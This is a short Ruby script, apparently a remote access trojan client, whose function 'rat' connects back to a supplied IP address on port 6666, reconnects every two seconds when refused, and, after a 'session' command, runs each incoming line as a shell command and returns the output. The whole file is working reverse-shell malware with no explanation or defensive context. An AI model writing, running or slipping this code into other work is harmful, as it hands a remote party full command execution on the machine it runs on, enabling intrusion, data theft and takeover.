#!/usr/bin/ruby
require 'socket'

def rat(ip)
  begin
    socket = TCPSocket.new(ip, 6666)
    loop do
      command = socket.gets.chomp
      case command
      when 'session'
        loop do
          cmd = socket.gets.chomp
          if cmd == 'exit'
            break
          end
          socket.puts `#{cmd}`
          socket.puts 'done'
        end
      end
    end

  rescue SocketError, Errno::ECONNREFUSED, Errno::ECONNRESET
    sleep 2
    retry
  end

end